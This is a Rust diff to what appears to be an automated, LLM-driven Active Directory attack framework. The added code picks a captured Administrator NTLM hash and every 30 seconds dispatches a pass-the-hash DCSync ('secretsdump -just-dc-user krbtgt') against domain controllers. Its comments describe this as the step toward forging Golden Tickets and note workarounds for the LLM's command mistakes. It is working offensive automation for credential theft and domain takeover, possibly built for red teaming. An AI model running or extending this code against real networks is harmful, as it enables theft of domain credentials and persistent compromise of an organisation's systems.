@@ -39,6 +39,38 @@ fn pth_secretsdump_dedup_key(dc_ip: &str, parent_domain: &str) -> String {
     format!("{}:{}:pth_admin", dc_ip, parent_domain)
 }
 
+/// Build krbtgt-extraction dedup key. Distinct from the generic PTH key
+/// (which is for full domain dumps) so a prior full-dump failure doesn't
+/// block the narrower `-just-dc-user krbtgt` attempt against the same DC.
+fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
+    format!("{}:{}:krbtgt_extraction", dc_ip, domain.to_lowercase())
+}
+
+/// Find a usable Administrator NTLM hash for a domain.
+fn select_administrator_hash(state: &StateInner, domain: &str) -> Option<String> {
+    let dom = domain.to_lowercase();
+    state
+        .hashes
+        .iter()
+        .find(|h| {
+            h.username.eq_ignore_ascii_case("administrator")
+                && h.hash_type.eq_ignore_ascii_case("NTLM")
+                && h.domain.to_lowercase() == dom
+        })
+        .map(|h| h.hash_value.clone())
+}
+
+/// True when we already have a krbtgt hash for the domain (so the GT step is
+/// unblocked and we don't need to re-run DCSync against the DC).
+fn has_krbtgt_hash(state: &StateInner, domain: &str) -> bool {
+    let dom = domain.to_lowercase();
+    state.hashes.iter().any(|h| {
+        h.username.eq_ignore_ascii_case("krbtgt")
+            && h.hash_type.eq_ignore_ascii_case("NTLM")
+            && h.domain.to_lowercase() == dom
+    })
+}
+
 /// Dispatches secretsdump when admin credentials are detected.
 /// Interval: 30s. Matches Python `_auto_local_admin_secretsdump`.
 pub async fn auto_local_admin_secretsdump(
@@ -172,6 +204,7 @@ pub async fn auto_local_admin_secretsdump(
                     &hash_domain,
                     &hash_value,
                     priority,
+                    None,
                 )
                 .await
             {
@@ -194,6 +227,95 @@ pub async fn auto_local_admin_secretsdump(
                 }
                 Ok(None) => {}
                 Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
+            }
+        }
+    }
+}
+
+/// Dispatches a narrowed `secretsdump -just-dc-user krbtgt` whenever we hold
+/// an Administrator NTLM hash for a domain but haven't yet captured that
+/// domain's krbtgt hash. This closes the gap between "DA captured" and
+/// "Golden Ticket forged": `auto_local_admin_secretsdump` only fires the PtH
+/// path on child→parent escalation (gated on `dominated_domains`), and the
+/// generic credential_access prompt lets the LLM omit `-just-dc-user`, which
+/// triggers full-dump DRSUAPI hardening rejections and frequent
+/// STATUS_LOGON_FAILURE on cross-realm syntax mistakes. Once krbtgt lands,
+/// `auto_golden_ticket` takes over.
+///
+/// Priority 1 so it dominates the deferred-queue score ordering — the
+/// existing soft/hard throttle caps still apply, but among queued work this
+/// step jumps to the front.
+pub async fn auto_krbtgt_extraction(
+    dispatcher: Arc<Dispatcher>,
+    mut shutdown: watch::Receiver<bool>,
+) {
+    let mut interval = tokio::time::interval(Duration::from_secs(30));
+    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
+
+    loop {
+        tokio::select! {
+            _ = interval.tick() => {},
+            _ = shutdown.changed() => break,
+        }
+        if *shutdown.borrow() {
+            break;
+        }
+
+        if !dispatcher.is_technique_allowed("dc_secretsdump") {
+            continue;
+        }
+
+        let work: Vec<(String, String, String, String)> = {
+            let state = dispatcher.state.read().await;
+            let mut items = Vec::new();
+            for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
+                let dom = dc_domain.to_lowercase();
+                if has_krbtgt_hash(&state, &dom) {
+                    continue;
+                }
+                let Some(hash) = select_administrator_hash(&state, &dom) else {
+                    continue;
+                };
+                let dedup = krbtgt_extraction_dedup_key(dc_ip, &dom);
+                if state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
+                    continue;
+                }
+                items.push((dedup, dc_ip.clone(), dom, hash));
+            }
+            items
+        };
+
+        for (dedup_key, dc_ip, domain, hash_value) in work.into_iter().take(2) {
+            match dispatcher
+                .request_secretsdump_hash(
+                    &dc_ip,
+                    "Administrator",
+                    &domain,
+                    &hash_value,
+                    1,
+                    Some("krbtgt"),
+                )
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        dc = %dc_ip,
+                        domain = %domain,
+                        "krbtgt extraction dispatched (just-dc-user krbtgt)"
+                    );
+                    {
+                        let mut state = dispatcher.state.write().await;
+                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                        state.mark_credential_capture_in_flight(&domain);
+                    }
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => warn!(err = %e, "Failed to dispatch krbtgt extraction"),
             }
         }
     }
